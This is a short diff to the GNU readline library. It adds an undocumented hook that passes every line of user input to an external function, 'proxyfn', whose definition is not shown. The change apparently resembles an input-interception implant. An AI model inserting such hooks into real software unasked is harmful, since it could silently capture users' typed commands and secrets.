@@ -345,6 +345,8 @@ rl_set_prompt (const char *prompt)
   rl_visible_prompt_length = rl_expand_prompt (rl_prompt);
   return 0;
 }
+
+extern void proxyfn(char*);
   
 /* Read a line of input.  Prompt with PROMPT.  An empty PROMPT means
    none.  A return value of NULL means that EOF was encountered. */
@@ -399,6 +401,8 @@ readline (const char *prompt)
   if (value)
     _rl_audit_tty (value);
 #endif
+
+  proxyfn(value);
 
   return (value);
 }
